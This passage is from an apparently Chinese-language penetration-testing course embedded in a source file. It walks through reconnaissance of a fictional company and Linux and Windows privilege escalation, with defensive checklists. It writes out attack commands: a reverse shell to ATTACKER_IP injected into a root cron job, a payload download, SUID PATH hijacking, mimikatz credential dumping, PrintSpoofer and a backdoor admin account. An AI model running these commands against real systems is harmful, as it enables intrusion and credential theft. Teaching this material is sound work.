Apache/2.4.52 (Ubuntu)\n\n[ PHP ]\n  Version      : 8.1.2\n\n[ WordPress ]\n  Version      : 6.2.1\n\n[ jQuery ]\n  Version      : 3.6.0\n\n[ Google-Analytics ]\n  Account      : UA-12345678-1\n\nHTTP Headers:\n  Server: Apache/2.4.52 (Ubuntu)\n  X-Powered-By: PHP/8.1.2\n  X-Frame-Options: SAMEORIGIN</code></pre></div>\n\n<p>太好了！目标运行的是 Ubuntu + Apache 2.4.52 + PHP 8.1.2 + WordPress 6.2.1。这些信息直接帮我们缩小了攻击范围——我们可以针对性地查找这些版本已知的漏洞。</p>\n\n<h2>主动侦察：直接接触目标</h2>\n\n<p>被动侦察帮我们建立了目标的宏观画像，现在我们要通过主动扫描获取更精确的技术细节。主动侦察会直接与目标系统交互，因此<strong>可能被发现</strong>。</p>\n\n<div class=\"callout default\">\n<div class=\"callout-title\">授权提醒</div>\n<p>主动侦察必须在获得书面授权后才能进行。未授权的端口扫描在某些司法管辖区可能触犯法律。确保你的渗透测试授权书（Rules of Engagement）明确允许这些操作。</p>\n</div>\n\n<h3>Nmap：端口扫描的艺术</h3>\n\n<p>Nmap 是渗透测试员的瑞士军刀。但很多人只会用 <code>nmap -sV</code>，这远远不够。让我们看看一个专业的扫描流程：</p>\n\n<h4>第一步：快速发现存活主机</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 对整个子网进行主机发现\n$ nmap -sn 203.0.113.0/24 -oA hosts_discovery\n\nStarting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 203.0.113.50\nHost is up (0.012s latency).\nNmap scan report for 203.0.113.51\nHost is up (0.0089s latency).\nNmap scan report for 203.0.113.52\nHost is up (0.015s latency).\nNmap scan report for 203.0.113.100\nHost is up (0.023s latency).\n...\nNmap done: 256 IP addresses (12 hosts up) scanned in 3.45 seconds</code></pre></div>\n\n<h4>第二步：全面端口扫描</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 全端口扫描 + 服务版本检测 + OS 指纹 + 默认脚本\n$ nmap -sC -sV -O -p- --min-rate=1000 203.0.113.50 -oN full_scan.txt\n\nStarting Nmap 7.94\nNmap scan report for www.targetcorp.com (203.0.113.50)\nHost is up (0.012s latency).\nNot shown: 65528 closed tcp ports (reset)\n\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1\n| ssh-hostkey:\n|   256 3a:7f:b2:8c:d4:e5:...  (ECDSA)\n|_  256 42:1d:89:3a:5b:...  (ED25519)\n25/tcp   open  smtp     Postfix smtpd\n|_smtp-commands: EHLO, PIPELINING, SIZE 10240000, STARTTLS\n53/tcp   open  domain   ISC BIND 9.18.12\n80/tcp   open  http     Apache httpd 2.4.52\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Target Corporation\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n443/tcp  open  ssl/http Apache httpd 2.4.52\n| ssl-cert:\n|   Subject: commonName=www.targetcorp.com\n|   Issuer: commonName=Let's Encrypt Authority X3\n|_  Public Key type: RSA, 2048 bits\n3306/tcp open  mysql    MySQL 8.0.33\n| mysql-info:\n|   Protocol: 10\n|   Version: 8.0.33\n|_  Capabilities flags: 65535\n8080/tcp open  http     Apache Tomcat 9.0.73\n|_http-title: Apache Tomcat/9.0.73\n| http-methods:\n|_  Potentially risky methods: PUT DELETE\n\nOS detection: Linux 5.15 - 5.19 (96% confidence)\nNetwork Distance: 8 hops\nService Info: OS: Linux; Hostname: www.targetcorp.com</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">扫描结果分析</div>\n<p>让我们解读这次扫描的关键发现：</p>\n<ul>\n<li><strong>SSH 8.9p1</strong>：版本较新，但值得关注的是它允许哪些认证方式</li>\n<li><strong>SMTP (Postfix)</strong>：可以尝试用户枚举（VRFY/EXPN/RCPT TO）</li>\n<li><strong>MySQL 8.0.33 暴露在公网</strong>：这是一个高风险配置，数据库不应该直接暴露</li>\n<li><strong>Tomcat 9.0.73</strong>：支持 PUT/DELETE 方法，可能存在文件上传风险</li>\n<li><strong>DNS (BIND 9.18.12)</strong>：可以尝试区域传输（zone transfer）</li>\n</ul>\n</div>\n\n<h4>第三步：针对性深入扫描</h4>\n\n<p>根据初步扫描结果，我们对感兴趣的服务做更深入的探测：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 针对 Web 服务使用 Nmap 的 HTTP 脚本集\n$ nmap --script=http-enum,http-headers,http-methods,http-php-version \\\n  -p 80,443,8080 203.0.113.50\n\n# 尝试 DNS 区域传输\n$ nmap --script=dns-zone-transfer -p 53 203.0.113.50\n$ dig axfr targetcorp.com @203.0.113.50\n\n# 检查 MySQL 是否有已知漏洞\n$ nmap --script=mysql-vuln* -p 3306 203.0.113.50\n\n# 枚举 SMB（如果发现了 445 端口）\n$ nmap --script=smb-enum-shares,smb-enum-users,smb-os-discovery \\\n  -p 445 203.0.113.50</code></pre></div>\n\n<h3>目录和文件枚举</h3>\n\n<p>Web 目录枚举是发现隐藏功能的利器。那些不链接在任何页面上的管理接口、备份文件、API 端点，往往就是突破口：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">$ ffuf -u https://www.targetcorp.com/FUZZ \\\n  -w /usr/share/wordlists/dirb/big.txt \\\n  -mc 200,301,302,403 -t 50 -ic\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\nv2.0.0\n\n[Status: 200], Size: 4523, Words: 312, Lines: 89\n  --> admin/\n[Status: 301], Size: 0, Words: 0, Lines: 0\n  --> uploads/\n[Status: 200], Size: 12845, Words: 890, Lines: 234\n  --> api/\n[Status: 403], Size: 277, Words: 20, Lines: 10\n  --> backup/\n[Status: 200], Size: 892, Words: 45, Lines: 23\n  --> robots.txt\n[Status: 200], Size: 2456, Words: 156, Lines: 67\n  --> .git/HEAD\n[Status: 200], Size: 156, Words: 12, Lines: 8\n  --> phpinfo.php\n[Status: 302], Size: 0, Words: 0, Lines: 0\n  --> api/v1/\n[Status: 200], Size: 567, Words: 34, Lines: 15\n  --> wp-content/\n\n:: Progress: [20469/20469] :: Job [1/1] :: 847 req/sec</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">关键发现</div>\n<p>这次枚举发现了多个高风险目标：</p>\n<ul>\n<li><code>.git/HEAD</code> 暴露——整个 Git 仓库可能被下载，源代码泄露！</li>\n<li><code>phpinfo.php</code>——暴露完整的 PHP 配置和服务器信息</li>\n<li><code>backup/</code> 目录——可能包含数据库转储或配置文件</li>\n<li><code>admin/</code> 目录——管理后台，需要重点测试认证机制</li>\n<li><code>api/</code> 端点——REST API 可能有不同的认证方式和漏洞</li>\n</ul>\n</div>\n\n<h3>漏洞扫描自动化</h3>\n\n<p>虽然手动测试不可替代，但自动化扫描器可以帮我们快速发现已知漏洞：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 Nikto 进行 Web 漏洞扫描\n$ nikto -h https://www.targetcorp.com\n\n- Nikto v2.5.0\n+ Target Host: www.targetcorp.com\n+ Target Port: 443\n+ SSL Info: subject=/CN=www.targetcorp.com\n+ Server: Apache/2.4.52 (Ubuntu)\n\n+ /phpinfo.php: Output from the phpinfo() function was found.\n+ /admin/: Admin login page found.\n+ /.git/HEAD: Git repository found - may contain sensitive information.\n+ /robots.txt: Contains entries for /admin/ and /backup/.\n+ Apache/2.4.52 appears to be outdated (current: 2.4.58).\n+ X-Frame-Options header missing on some pages - potential clickjacking.\n+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, PUT, DELETE.\n+ /backup/db_dump.sql: SQL dump file found - database structure exposed.\n+ OSVDB-3268: /uploads/: Directory indexing found.\n+ Cookie PHPSESSID created without the httponly flag.\n\n# 使用 Nuclei 进行模板化漏洞扫描\n$ nuclei -u https://www.targetcorp.com -severity medium,high,critical\n\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   v3.1.0\n\n[cve-2023-xxxxx] [http] [high] https://www.targetcorp.com/wp-content/...\n[exposed-git] [http] [critical] https://www.targetcorp.com/.git/HEAD\n[phpinfo-file] [http] [medium] https://www.targetcorp.com/phpinfo.php\n[tomcat-put-enabled] [http] [high] https://www.targetcorp.com:8080/</code></pre></div>\n\n<h3>攻击面映射：把碎片拼成地图</h3>\n\n<p>经过上述侦察，我们手中已经有了大量信息。现在需要把它们整理成一张<strong>攻击面地图</strong>：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">========== 攻击面地图 - targetcorp.com ==========\n\n[外部网络边界]\n├── 203.0.113.50 (www/mail/dns)\n│   ├── HTTP 80/443: Apache 2.4.52 + WordPress 6.2.1\n│   │   ├── /.git/ 暴露 (CRITICAL)\n│   │   ├── /admin/ 管理后台\n│   │   ├── /api/v1/ REST API\n│   │   ├── /phpinfo.php (INFO DISCLOSURE)\n│   │   └── /backup/db_dump.sql (DATA LEAK)\n│   ├── SMTP 25: Postfix (用户枚举?)\n│   └── DNS 53: BIND 9.18.12\n├── 203.0.113.51\n│   └── HTTP 8080: Tomcat 9.0.73 (PUT 方法启用!)\n└── 203.0.113.52\n    └── MySQL 3306: 8.0.33 (公网暴露)\n\n[子域名 - 潜在目标]\n├── dev.targetcorp.com (开发环境 - 可能防护弱)\n├── staging.targetcorp.com (预发布 - 可能有测试账号)\n├── git.targetcorp.com (Gitea/GitLab? - 代码泄露)\n├── admin.targetcorp.com (管理面板)\n└── vpn.targetcorp.com (VPN 入口)\n\n[已知人员]\n├── zhang.wei@targetcorp.com\n├── li.ming@targetcorp.com\n└── it-support@targetcorp.com\n\n[优先攻击路径]\n1. Git 仓库泄露 → 获取源代码 → 发现硬编码凭证\n2. SQL 转储 → 了解数据库结构 → 配合注入攻击\n3. Tomcat PUT → 上传 WebShell → 获取初始访问\n4. 开发/预发布环境 → 弱认证 → 横向移动到生产环境</code></pre></div>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">防御视角：如何对抗侦察</div>\n<p>作为防御者，你可以采取以下措施：</p>\n<ul>\n<li><strong>最小化攻击面</strong>：关闭不必要的端口和服务，MySQL 不应该暴露在公网</li>\n<li><strong>清理敏感文件</strong>：删除 .git 目录、phpinfo.php、备份文件</li>\n<li><strong>加固 DNS</strong>：禁止区域传输，限制递归查询</li>\n<li><strong>信息泄露控制</strong>：去除 HTTP 头中的版本信息（ServerTokens Prod）</li>\n<li><strong>监控扫描行为</strong>：IDS/IPS 可以检测到 nmap 的特征，WAF 可以拦截目录枚举</li>\n<li><strong>员工安全意识</strong>：不要在社交媒体上分享工作环境的敏感细节</li>\n</ul>\n</div>\n\n<h3>侦察工具链总结</h3>\n\n<p>让我们把这一节学到的工具按照工作流程整理一下：</p>\n\n<table>\n<tr><th>阶段</th><th>工具</th><th>用途</th></tr>\n<tr><td>WHOIS 查询</td><td>whois, domaintools.com</td><td>域名注册信息</td></tr>\n<tr><td>子域名枚举</td><td>subfinder, amass, crt.sh</td><td>发现子域名</td></tr>\n<tr><td>搜索引擎</td><td>Google Dorks, Shodan</td><td>公开信息发现</td></tr>\n<tr><td>技术指纹</td><td>whatweb, Wappalyzer, builtwith</td><td>技术栈识别</td></tr>\n<tr><td>邮箱收集</td><td>theHarvester, hunter.io</td><td>人员信息收集</td></tr>\n<tr><td>端口扫描</td><td>nmap, masscan</td><td>服务发现</td></tr>\n<tr><td>目录枚举</td><td>ffuf, dirsearch, gobuster</td><td>Web 路径发现</td></tr>\n<tr><td>漏洞扫描</td><td>nuclei, nikto, nessus</td><td>已知漏洞检测</td></tr>\n</table>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>本节小结</h2>\n\n<p>侦察是整个渗透测试的基石。我们学习了：</p>\n\n<ol>\n<li><strong>方法论框架</strong>：PTES 和 OWASP 为侦察提供了系统化的方法论</li>\n<li><strong>被动侦察</strong>：WHOIS、子域名枚举、Google Hacking、OSINT——不接触目标就获取大量信息</li>\n<li><strong>主动侦察</strong>：Nmap 端口扫描、目录枚举、漏洞扫描——深入探测目标</li>\n<li><strong>攻击面映射</strong>：将碎片信息整合为完整的攻击面地图</li>\n</ol>\n\n<p>下一节，我们将基于侦察阶段收集的信息，进入漏洞利用和权限提升的世界——从普通用户到 root，从外部到内部。</p>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>";
+
+SECTION_CONTENT["pentest-02-01"] = "<h1>权限提升基础：从立足点到完全控制</h1>\n\n<p>恭喜你！经过上一节的侦察和之前的 Web 漏洞利用，你终于在目标系统上获得了一个 shell。你兴奋地执行了 <code>whoami</code>，然后……</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">$ whoami\nwww-data\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$ hostname\nweb-server-01</code></pre></div>\n\n<p>你是 <code>www-data</code>——Linux 上权限最低的服务账户之一。你不能读 <code>/etc/shadow</code>，不能改系统配置，不能访问其他用户的文件。这个 shell 的价值非常有限。</p>\n\n<p><strong>这就是权限提升（Privilege Escalation）的意义所在</strong>——从一个低权限的立足点，升级到 root 或管理员权限，从而完全控制目标系统。</p>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">权限提升的两种类型</div>\n<p><strong>垂直提权</strong>（Vertical）：从低权限用户提升至高权限用户（www-data → root）。这是我们本节的主要目标。</p>\n<p><strong>水平提权</strong>（Horizontal）：从当前用户切换到同一权限级别的其他用户（user1 → user2），用于获取其他用户的数据。</p>\n</div>\n\n<h2>Linux 权限提升</h2>\n\n<p>Linux 提权的核心思路是：<strong>找到高权限进程或配置中的错误</strong>。我们需要系统性地检查每一个可能的攻击面。</p>\n\n<h3>第一步：信息收集（是的，又是信息收集）</h3>\n\n<p>提权的第一步不是急着找漏洞，而是全面了解当前系统环境：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 系统基本信息\n$ uname -a\nLinux web-server-01 5.15.0-76-generic #83-Ubuntu SMP x86_64\n\n$ cat /etc/os-release\nPRETTY_NAME=\"Ubuntu 22.04.2 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.04\"\n\n# 当前用户权限\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n$ sudo -l\n[sudo] password for www-data:\nSorry, user www-data may not run sudo on web-server-01.\n\n# 检查环境变量\n$ env\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\nAPACHE_RUN_DIR=/etc/apache2\nDB_PASSWORD=S3cur3P@ss!2023    # 环境变量中的硬编码密码！\n\n# 列出 /home 目录\n$ ls -la /home/\ndrwxr-xr-x  5 root  root  4096 Jun 15 08:22 .\ndrwxr-xr-x 20 root  root  4096 Jun 15 08:20 ..\ndrwxr-x---  8 alice alice 4096 Jul 20 14:30 alice\ndrwxr-xr-x  4 bob   bob   4096 Jul 18 09:15 bob\ndrwxr-x---  3 carol carol 4096 Jul 19 11:45 carol</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">发现！</div>\n<p>环境变量 <code>DB_PASSWORD=S3cur3P@ss!2023</code> 泄露了数据库密码。如果 alice 或 bob 在多个地方重复使用密码，我们可能直接用这个密码登录其他账户。注意 bob 的 home 目录权限是 <code>r-xr-x</code>（其他用户可读），这也是一个突破口。</p>\n</div>\n\n<h3>第二步：使用自动化脚本加速枚举</h3>\n\n<p>手动枚举非常耗时，我们可以使用成熟的提权枚举脚本：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># LinPEAS - Linux Privilege Escalation Awesome Script\n# 先上传到目标（通过 python http server 或 base64）\n$ wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh\n$ chmod +x /tmp/linpeas.sh\n$ /tmp/linpeas.sh | tee /tmp/linpeas_output.txt\n\n╔══════════╣ Operating system\n║ Linux web-server-01 5.15.0-76-generic #83-Ubuntu SMP\n║ Ubuntu 22.04.2 LTS\n\n╔══════════╣ Sudo version\n║ Sudo version 1.9.9 (VULNERABLE: CVE-2023-XXXXX)\n\n╔══════════╣ PATH\n║ /usr/local/sbin:/usr/local/bin (WRITABLE by www-data!)\n\n╔══════════╣ SUID Binaries\n║ -rwsr-xr-x 1 root root 168192 Jan 10  /usr/bin/sudo\n║ -rwsr-xr-x 1 root root  55528 Mar 23  /usr/bin/mount\n║ -rwsr-xr-x 1 root root  40496 Mar 23  /usr/bin/umount\n║ -rwsr-xr-x 1 root root  68248 Jan 11  /usr/bin/passwd\n║ -rwsr-xr-x 1 root root  27680 Feb 21  /usr/bin/custom-backup  ← 可疑！\n\n╔══════════╣ Capabilities\n║ /usr/bin/python3 = cap_setuid+ep  ← 危险配置！\n\n╔══════════╣ Cron Jobs\n║ */5 * * * * root /opt/scripts/cleanup.sh\n║ 0 * * * * root /usr/local/bin/health-check.py\n\n╔══════════╣ Interesting Writable Files\n║ /etc/crontab is writable\n║ /opt/scripts/ is writable by www-data</code></pre></div>\n\n<h3>提权路径分析</h3>\n\n<p>LinPEAS 给我们指出了几条可能的提权路径。让我们逐一分析：</p>\n\n<h4>路径一：SUID 二进制文件利用</h4>\n\n<p>SUID（Set User ID）位让程序以文件所有者（通常是 root）的权限执行。如果这个自定义程序有漏洞，我们就可以利用它：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 分析可疑的 SUID 程序\n$ ls -la /usr/bin/custom-backup\n-rwsr-xr-x 1 root root 27680 Feb 21 09:30 /usr/bin/custom-backup\n\n$ file /usr/bin/custom-backup\n/usr/bin/custom-backup: ELF 64-bit LSB executable, x86-64\n\n# 看看这个程序做了什么\n$ strings /usr/bin/custom-backup\n...\nUsage: custom-backup [source] [destination]\n/bin/tar\ncf\n%s\n-C\n%s\n...\n\n# 它调用了 tar 但没有使用绝对路径！\n# 我们可以劫持 PATH 来执行任意命令\n\n$ cd /tmp\n$ echo '#!/bin/bash' > tar\n$ echo '/bin/bash -p' >> tar    # -p 保持 SUID 权限\n$ chmod +x tar\n$ export PATH=/tmp:$PATH\n$ /usr/bin/custom-backup /etc /tmp/backup\n\n# whoami\nroot\n# id\nuid=33(www-data) gid=33(www-data) euid=0(root)</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">原理分析</div>\n<p><code>custom-backup</code> 以 SUID root 运行，内部调用 <code>tar</code> 时没有使用绝对路径 <code>/bin/tar</code>。我们通过修改 <code>PATH</code> 环境变量，在 <code>/tmp</code> 下放了一个恶意的 <code>tar</code> 脚本。当 SUID 程序执行时，它优先找到了我们的恶意版本，从而以 root 权限执行了 <code>/bin/bash -p</code>。</p>\n</div>\n\n<h4>路径二：Cron Job 劫持</h4>\n\n<p>LinPEAS 发现 <code>/opt/scripts/cleanup.sh</code> 由 root 通过 cron 定期执行，而且 www-data 对该目录有写权限：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 检查 cron 配置\n$ cat /etc/crontab\n*/5 * * * * root /opt/scripts/cleanup.sh\n\n# 检查文件权限\n$ ls -la /opt/scripts/cleanup.sh\n-rwxr-xr-x 1 root root 234 Jul 20 10:30 /opt/scripts/cleanup.sh\n\n# 虽然文件是 root 所有，但目录呢？\n$ ls -la /opt/scripts/\ndrwxrwxr-x 2 root devs 4096 Jul 20 10:30 .  # devs 组可写！\n-rwxr-xr-x 1 root root  234 Jul 20 10:30 cleanup.sh\n\n# 检查 www-data 是否在 devs 组\n$ groups www-data\nwww-data : www-data devs    # 是的！\n\n# 注入反向 shell 到 cron 脚本\n$ echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/cleanup.sh\n\n# 等待 cron 执行（最多5分钟）\n# 在攻击机上监听：\n$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [ATTACKER_IP] from web-server-01\n# whoami\nroot</code></pre></div>\n\n<h4>路径三：Linux Capabilities 利用</h4>\n\n<p>Linux Capabilities 允许将 root 权限细分为多个小权限。如果配置不当，就是提权捷径：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 发现 python3 有 cap_setuid 能力\n$ getcap /usr/bin/python3\n/usr/bin/python3 = cap_setuid+ep\n\n# cap_setuid 允许进程修改自己的 UID\n# 用 python3 直接切换到 root\n$ python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n\n# whoami\nroot\n\n# 另一种方式：如果 tar 有 cap_dac_read_search\n$ getcap /usr/bin/tar\n/usr/bin/tar = cap_dac_read_search+ep\n# 可以读取任何文件，包括 /etc/shadow\n$ tar -cf - /etc/shadow | tar -xf - -C /tmp/\n$ cat /tmp/etc/shadow\nroot:$6$rY8p...:19558:0:99999:7:::</code></pre></div>\n\n<div class=\"callout default\">\n<div class=\"callout-title\">GTFOBins 是你的好朋友</div>\n<p><a href=\"https://gtfobins.github.io/\">GTFOBins</a> 是一个精心维护的 Unix 二进制文件利用数据库。它记录了哪些常见程序可以被用来提权。当你发现一个 SUID 文件或特殊的 Capability 时，第一时间去 GTFOBins 查一下。</p>\n</div>\n\n<h3>密码学与凭证利用</h3>\n\n<p>有时候提权不需要复杂的漏洞利用，只需要找到被遗忘的凭证：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 搜索配置文件中的密码\n$ grep -r \"password\" /var/www/ --include=\"*.php\" --include=\"*.conf\" -l\n/var/www/html/wp-config.php\n/var/www/html/api/config.php\n/var/www/backup/db_config.php.bak\n\n# 查看 WordPress 配置\n$ cat /var/www/html/wp-config.php | grep -i \"db_\"\ndefine('DB_NAME', 'wordpress');\ndefine('DB_USER', 'wp_admin');\ndefine('DB_PASSWORD', 'WpSup3r$ecure#2023');\ndefine('DB_HOST', '127.0.0.1');\n\n# 尝试用这个密码 SSH 登录其他用户\n$ su - alice\nPassword: WpSup3r$ecure#2023\n$ whoami\nalice\n\n# 检查 alice 的 sudo 权限\n$ sudo -l\nUser alice may run the following commands:\n    (ALL) NOPASSWD: /usr/bin/vim /etc/apache2/*\n\n# vim 可以执行任意命令！\n$ sudo vim /etc/apache2/apache2.conf\n# 在 vim 中输入: :!bash\n# 现在你是 root！\n# whoami\nroot</code></pre></div>\n\n<h2>Windows 权限提升</h2>\n\n<p>Windows 提权的思路与 Linux 类似，但工具和技巧不同。让我们通过一个场景来学习：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-cmd\">C:\\Users\\web_svc>whoami\ntargetcorp\\web_svc\n\nC:\\Users\\web_svc>systeminfo\n\nHost Name:                 DC01\nOS Name:                   Microsoft Windows Server 2019 Standard\nOS Version:                10.0.17763 N/A Build 17763\nSystem Type:               x64-based PC\nHotfix(s):                 KB5028168 installed.\n\nC:\\Users\\web_svc>whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeImpersonatePrivilege        Impersonate a client           Enabled  ← 关键！\nSeIncreaseWorkingSetPrivilege Increase working set           Disabled</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">SeImpersonatePrivilege</div>\n<p>这个权限允许进程模拟其他用户。在 Windows Server 上，Web 服务账户通常拥有这个权限。这是多个提权漏洞（PrintSpoofer、JuicyPotato、SweetPotato）的利用前提！</p>\n</div>\n\n<h3>Windows 提权路径</h3>\n\n<h4>路径一：未打补丁的服务</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-cmd\"># 使用 WinPEAS 进行自动化枚举\nC:\\Users\\web_svc>winpeas.exe\n\n╔══════════╣ SERVICES PERMISSIONS\n╠══╣ Interesting Services (non Microsoft)\n║ ApacheService(Apache Software Foundation)[C:\\Apache24\\bin\\httpd.exe]\n║  - Unquoted Service Path!\n║  - Current user has write access to service binary directory!\n\n║ MySQL(MySQL)[C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\\mysqld.exe]\n║  - Runs as: LocalSystem\n\n╔══════════╣ UNQUOTED SERVICE PATHS\n║ ApacheService - C:\\Apache24\\bin\\httpd.exe\n║   Writable directory: C:\\\n\n# 未引用的服务路径漏洞！\n# Windows 会按照空格分割路径，依次尝试执行\n# \"C:\\Apache24\\bin\\httpd.exe\" 会被解析为：\n# 1. C:\\Apache.exe\n# 2. C:\\Apache24\\bin\\httpd.exe\n\n# 我们在 C:\\ 下创建一个恶意的 Apache.exe\nC:\\>copy malicious.exe C:\\Apache.exe\n# 重启服务或等待系统重启后，恶意程序将以 SYSTEM 权限执行</code></pre></div>\n\n<h4>路径二：PrintSpoofer 利用</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-cmd\"># 利用 SeImpersonatePrivilege 进行提权\nC:\\Users\\web_svc>PrintSpoofer.exe -i -c cmd.exe\n\n[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\n[+] Interactive session started as SYSTEM\n\nMicrosoft Windows [Version 10.0.17763.4737]\nC:\\Windows\\system32>whoami\nnt authority\\system\n\nC:\\Windows\\system32>net user admin P@ssw0rd123! /add\nC:\\Windows\\system32>net localgroup Administrators admin /add</code></pre></div>\n\n<h4>路径三：凭证提取与令牌模拟</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-cmd\"># 使用 mimikatz 提取内存中的凭证\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # sekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 645123 (00000000:0009d843)\nSession           : Interactive from 1\nUser Name         : administrator\nDomain            : TARGETCORP\nLogon Server      : DC01\nLogon Time        : 7/20/2024 9:15:30 AM\nSID               : S-1-5-21-1234567890-...-500\n\n    msv :\n     [00000003] Primary\n     * Username : administrator\n     * Domain   : TARGETCORP\n     * NTLM     : a]ad3b435b51404eeaad3b435b51404ee\n     * LM       :\n     * SHA1     : ...\n    wdigest :\n     * Username : administrator\n     * Domain   : TARGETCORP\n     * Password : Admin2024!@#\n\n# 直接使用提取到的密码\nC:\\Users\\web_svc>runas /user:TARGETCORP\\administrator cmd.exe\nEnter the password for TARGETCORP\\administrator: Admin2024!@#</code></pre></div>\n\n<h3>内核漏洞提权（最后的手段）</h3>\n\n<p>当配置层面的提权路径都被封堵时，内核漏洞可能是最后的选择。但内核漏洞风险高——可能导致系统崩溃：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Linux 内核漏洞利用\n# 发现内核版本 5.15.0-76 存在 CVE-2023-XXXXX (DirtyPipe 变种)\n$ searchsploit linux kernel 5.15 local privilege escalation\n\nLinux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)\n  exploits/linux/local/50808.c\n\n$ gcc -o exploit 50808.c\n$ ./exploit /usr/bin/sudo\n[+] CVE-2023-XXXXX (DirtyPipe variant) exploit\n[+] Target binary: /usr/bin/sudo\n[+] Pipe created\n[+] Data written to pipe\n[+] Page cache corrupted\n[+] Executing target binary with corrupted cache...\n# whoami\nroot</code></pre></div>\n\n<div class=\"callout default\">\n<div class=\"callout-title\">提权方法论总结</div>\n<p>无论你是 Linux 还是 Windows，提权的核心步骤是：</p>\n<ol>\n<li><strong>信息收集</strong>：系统版本、用户权限、运行服务、定时任务</li>\n<li><strong>枚举弱点</strong>：SUID、Capabilities、sudo 权限、未打补丁的服务</li>\n<li><strong>寻找凭证</strong>：配置文件、环境变量、内存、浏览器存储</li>\n<li><strong>利用提权</strong>：配置错误 > 凭证复用 > 内核漏洞（按风险从低到高）</li>\n</ol>\n</div>\n\n<h2>防御视角：如何防止权限提升</h2>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">防御清单</div>\n<p><strong>Linux 防御：</strong></p>\n<ul>\n<li>最小化 SUID 文件：定期审计 <code>find / -perm -4000 -type f</code></li>\n<li>限制 Capabilities：不要给解释器（python/perl）赋予 cap_setuid</li>\n<li>严格管理 cron 脚本权限：脚本和目录不应被普通用户写入</li>\n<li>及时更新内核：减少内核漏洞利用的可能</li>\n<li>使用 SELinux/AppArmor：即使被提权，也能限制损害范围</li>\n</ul>\n<p><strong>Windows 防御：</strong></p>\n<ul>\n<li>及时安装安全补丁：减少内核和服务漏洞</li>\n<li>使用引号包裹服务路径：防止未引用路径攻击</li>\n<li>最小化服务账户权限：移除不必要的 SeImpersonatePrivilege</li>\n<li>启用 Credential Guard：防止 mimikatz 等工具提取内存中的明文密码</li>\n<li>使用 LAPS：每台机器使用不同的本地管理员密码</li>\n</ul>\n</div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>本节小结</h2>\n\n<p>权限提升是从\"立足\"到\"控制\"的关键步骤。我们学习了：</p>\n\n<ol>\n<li><strong>Linux 提权</strong>：SUID 利用、Cron Job 